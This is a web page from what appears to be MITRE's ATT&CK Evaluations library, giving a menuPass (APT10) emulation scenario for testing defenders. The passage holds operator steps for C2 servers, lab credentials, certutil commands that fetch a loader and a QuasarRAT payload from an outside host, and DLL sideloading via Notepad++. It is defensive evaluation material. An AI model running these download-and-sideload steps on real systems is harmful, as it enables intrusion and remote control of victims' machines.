<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-H74RC38PBM"></script>
    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-H74RC38PBM');</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/ael">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.786727257842">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.6.0">

    <!-- Primary Meta Tags -->
    <title>menuPass Scenario Overview</title>
    <meta name="title" content="menuPass Scenario Overview">
    <meta name="description" content="Initiate an RDP session to the Windows jumpbox homelander (116.83.1.29)">

    <!-- Canonical -->
    <link rel="canonical" href="https://attackevals.github.io/ael/managedservices/menupass/emulation_plan/msr2_menupass_scenario/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://attackevals.github.io/ael/managedservices/menupass/emulation_plan/msr2_menupass_scenario/">
    <meta property="og:title" content="menuPass Scenario Overview">
    <meta property="og:description" content="Initiate an RDP session to the Windows jumpbox homelander (116.83.1.29)">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://attackevals.github.io/ael/managedservices/menupass/emulation_plan/msr2_menupass_scenario/">
    <meta property="twitter:title" content="menuPass Scenario Overview">
    <meta property="twitter:description" content="Initiate an RDP session to the Windows jumpbox homelander (116.83.1.29)">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../favicon.png" rel="icon">
    <link href="../../../../resources/css/retype.css?v=3.6.0.786727257842" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.6.0.786727257842" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.6.0.786727257842" data-turbo-eval="false" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
                            </span>
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
                        </a>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <nav class="breadcrumb" aria-label="Breadcrumb">
                                    <ol role="list">
                                        <li class="pr-4">
                                            <a href="../../../../" class="pr-4">
                                                ATT&​CK Evaluations Library
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <span class="pr-4">
                                                Managed Services
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../managedservices/menupass/" class="pr-4">
                                                menu​Pass
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../managedservices/menupass/emulation_plan/" class="pr-4">
                                                menu​Pass Emulation Plans
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../managedservices/menupass/emulation_plan/msr2_menupass_scenario/" class="pr-4">
                                                menu​Pass Scenario Overview
                                            </a>
                                        </li>
                                    </ol>
                                </nav>
                
                                <!-- Page content  -->
<doc-anchor-target id="menupass-scenario-overview" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#menupass-scenario-overview">#</doc-anchor-trigger>
        <span>menuPass Scenario Overview</span>
    </h1>
</doc-anchor-target>
<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
    <div>In&nbsp;</div>
    <div><a href="../../categories/managed-services/">Managed-Services</a></div>
</div>

<doc-anchor-target id="step-0---operator-setup">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-0---operator-setup">#</doc-anchor-trigger>
        <span>Step 0 - Operator Setup</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Initiate an RDP session to the Windows jumpbox <code v-pre>homelander (116.83.1.29)</code></p>
</li>
<li><p>Search for Command Prompt and right-click Run As Administrator. Execute the
following command to start the Quasar C2 server:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">C:\menu_pass\Resources\Quasar\bin\Release\net472\Quasar.exe -c C:\menu_pass\Resources\Quasar\quasar.p12</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Initiate an RDP session to the Kali attack host <code v-pre>kraken (176.59.1.18)</code></p>
</li>
<li><p>In a new terminal window, start the evalsC2server, ensuring the following
handlers are enabled:</p>
<ul>
<li>QuasarRAT</li>
<li>SodaMaster</li>
<li>Simple file server</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cd menu_pass/Resources/control_server
sudo go build -o controlServer main.go
sudo ./controlServer -c config/msr2_handler_config.yml</code></pre>
</doc-codeblock></div>
</li>
<li><p>Right-click within the terminal window and click &quot;Split Terminal Horizontally&quot;. Within the new terminal, change directory to the location of the evalsC2client.py and <strong>use this terminal for tasking implants</strong>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cd menu_pass/Resources/control_server</code></pre>
</doc-codeblock></div>
</li>
</ul>
<doc-anchor-target id="step-1---establish-persistence">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---establish-persistence">#</doc-anchor-trigger>
        <span>Step 1 - Establish Persistence</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>menuPass gains initial access via stolen credentials with local administrative
privileges. These credentials allow the adversary to access the Microsoft
Internet Information Services (IIS) web server <code v-pre>gabumon (10.10.10.9)</code> in
Subsidiary A’s environment via RDP.</p>
<p>After establishing access on the IIS server <code v-pre>gabumon (10.10.10.9)</code>, menuPass
downloads Sigloader, its components, and the encrypted QuasarRAT module on the
victim device using <code v-pre>certutil</code>. SigLoader is a multi-layer loader that loads
and decrypts the target payload. Eventually, SigLoader will load the first
payload, FYAnti, in memory.</p>
<p>FYAnti decrypts the first embedded .NET module and executes the module using
the <code v-pre>CppHostCLR</code> technique to avoid dropping additional files to disk. When
executed, the first embedded .NET module then enumerates files to find the
QuasarRAT .NET module on disk, decrypts it, and then executes it.</p>
<p>QuasarRAT, which has been modified and heavily obfuscated, checks first for
internet connectivity then connects to the C2 server using a redirector at
<code v-pre>notepad-plusplus-updates[.]com (121.93.4.32)</code>.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>From the Windows jumpbox <code v-pre>homelander (116.83.1.29)</code>, using the provided
stolen system credentials, RDP to the IIS Server <code v-pre>gabumon (10.10.10.9)</code>.</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>DIGIRUNAWAY\kizumi</td>
<td>ydJEeqNzN4Xqkd9h@</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Open Command Prompt with administrative privileges</p>
</li>
<li><p>Execute <code v-pre>certutil</code> to download SigLoader and FYAnti components.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">certutil.exe -urlcache -f http://ten-cent.us/files/VERSION.dll &quot;C:\Program Files\Notepad++\VERSION.dll&quot;
certutil.exe -urlcache -f http://ten-cent.us/files/skt.dll %SYSTEMROOT%\System32\skt.dll
certutil.exe -urlcache -f http://ten-cent.us/files/mshtml.wpf.wfx %SYSTEMROOT%\Microsoft.NET\mshtml.wpf.wfx
certutil.exe -urlcache -f http://ten-cent.us/files/ngen.old2.log %SYSTEMROOT%\Microsoft.NET\Framework64\v4.0.30319\ngen.old2.log</code></pre>
</doc-codeblock></div>
<ul>
<li>Note:
<ul>
<li><code v-pre>VERSION.dll</code> is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_layer1.dll</li>
<li><code v-pre>skt.dll</code> is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_layer2.dll</li>
<li><code v-pre>mshtml.wpf.wfx</code> is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_fyanti.dll</li>
<li><code v-pre>ngen.old2.log</code> is a symbolic link to menu_pass/Resources/payloads/sigloader/Client.exe.enc</li>
</ul>
</li>
</ul>
</li>
<li><p>Execute NotePad++.exe to perform DLL sideloading. SigLoader will load
FYAnti and FYAnti will load QuasarRAT.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">&quot;C:\Program Files\Notepad++\notepad++.exe&quot;</code></pre>
</doc-codeblock></div>
<ul>
<li><strong>NOTE:</strong> the current working directory should be <code v-pre>C:\Windows\System32</code>. This is where the Quasar <code v-pre>clientmanagement.log</code> will be dropped.</li>
</ul>
</li>
<li><p>Confirm C2 registration of QuasarRAT</p>
</li>
<li><p><strong>Minimize</strong> Notepad++ and close out of all other windows, then disconnect from the RDP session (do not sign out)</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<ol>
<li><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/">https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/</a></li>
<li><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf">http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf</a></li>
<li><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf">https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf</a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf">https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf</a></li>
<li><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage">https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage</a></li>
<li><a href="https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html">https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html</a></li>
<li><a href="https://www.lac.co.jp/lacwatch/report/20201201_002363.html">https://www.lac.co.jp/lacwatch/report/20201201_002363.html</a></li>
</ol>
 <details>
   <summary>:link: Click to expand source code links table</summary>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>RDP to the IIS server</td>
<td>-</td>
<td>T1021.001 Remote Services: Remote Desktop Protocol</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage" class="outbound" target="_blank"><span>Symantec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.justice.gov/archives/opa/page/file/1122671/download" class="outbound" target="_blank"><span>DOJ</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Authenticate with IIS admin credentials</td>
<td>-</td>
<td>T1078.002 Valid Accounts: Domain Accounts</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage" class="outbound" target="_blank"><span>Symantec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.justice.gov/archives/opa/page/file/1122671/download" class="outbound" target="_blank"><span>DOJ</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Open cmd</td>
<td>-</td>
<td>T1059.003 Command and Scripting Interpreter: Windows Command Shell</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Execute certutil to download Sigloader, FYAnti, and QuasarRAT components</td>
<td>-</td>
<td>T1105 Ingress Tool Transfer</td>
<td><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage" class="outbound" target="_blank"><span>Symantec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Dropped files were modified to contain shellcode</td>
